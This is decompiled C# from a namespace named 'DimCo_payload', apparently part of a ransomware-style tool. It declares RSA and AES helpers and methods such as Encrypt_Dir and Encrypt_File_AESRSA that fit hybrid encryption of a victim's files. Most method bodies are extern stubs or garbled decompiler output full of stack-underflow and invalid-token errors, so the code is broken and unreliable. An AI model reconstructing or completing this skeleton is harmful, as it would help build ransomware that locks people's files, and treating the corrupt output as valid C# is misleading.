using System;
using System.Runtime.CompilerServices;

namespace DimCo_payload.Encryption;

public class Encryption
{
	public static class RSA
	{
		[Serializable]
		public class EncryptorRSAKeys
		{
			public extern string PublicKey
			{
				[CompilerGenerated]
				get;
				[CompilerGenerated]
				set;
			}

			public extern string PrivateKey
			{
				[CompilerGenerated]
				get;
				[CompilerGenerated]
				set;
			}

			public extern EncryptorRSAKeys();
		}

		private static bool _optimalAsymmetricEncryptionPadding;

		public unsafe static EncryptorRSAKeys GenerateKeys(int keySize)
		{
			_ = *(uint*)(nint)/*Error near IL_0001: Stack underflow*/;
			/*Error: Unexpected end of block*/;
		}

		public static extern string EncryptText(string text, string publicKey);

		public static extern byte[] EncryptBytes(byte[] bytes, string publicKey);

		public unsafe static byte[] DecryptBytes(byte[] bytes, string publicKey)
		{
			//IL_0011: Expected F8, but got I
			do
			{
				/*OpCode not supported: DebugBreak*/;
			}
			while (/*Error near IL_0007: Stack underflow*/ < /*Error near IL_0007: Stack underflow*/);
			((double[])(*(long*)7))[/*Error near IL_000a: ldarg 2 (out-of-bounds)*/] = (nint)checked((nuint)/*Error near IL_000d: ldloc 0 (out-of-bounds)*/);
			switch (/*Error near IL_0016: Stack underflow*/)
			{
			default:
				;
				break;
			}
			/*Error: Unexpected end of block*/;
		}

		public static byte[] Encrypt(byte[] data, int keySize, string publicKeyXml)
		{
			//Discarded unreachable code: IL_0005
			/*Error: Invalid metadata token*/;
		}

		public static extern string DecryptText(string text, string privateKey);

		public static extern byte[] Decrypt(byte[] data, int keySize, string publicAndPrivateKeyXml);

		public static extern int GetMaxDataLength(int keySize);

		public static extern bool IsKeySizeValid(int keySize);

		private static extern string IncludeKeyInEncryptionString(string publicKey, int keySize);

		private static extern void GetKeyFromEncryptionString(string rawkey, out int keySize, out string xmlKey);
	}

	public class AES
	{
		public static extern byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes);

		public static extern byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes);

		public extern AES();
	}

	private static Random RNG;

	public extern int A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A();

	public static extern byte[] Generate_AES_Key();

	public static extern byte[] Decrypt_File_AESRSA(Tuple<byte[], byte[]> encoded, string RSA_Private_Key);

	public static extern string RandomString(int minlen, int maxlen);

	public static extern string Base64Encode(byte[] plainText);

	public static extern void Encrypt_Dir(string dir, string RSA_Public_Key);

	public static extern Tuple<byte[], byte[]> Encrypt_File_AESRSA(byte[] File, string RSA_Public_Key, byte[] AES);

	public extern Encryption();
}
